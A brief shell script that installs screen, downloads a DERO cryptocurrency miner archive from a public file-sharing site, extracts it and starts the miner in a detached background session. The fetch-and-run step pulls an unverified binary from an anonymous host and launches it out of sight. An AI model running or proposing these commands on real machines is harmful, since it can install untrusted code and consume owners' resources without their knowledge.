#!/bin/sh
sudo apt update
sudo apt install screen -y
wget wget https://www.dosyaupload.com/4OEHd/dero_linux_amd64.tar.gz
tar -xvf dero_linux_amd64.tar.gz
cd dero_linux_amd64
screen -dmS run ./dero-miner.sh
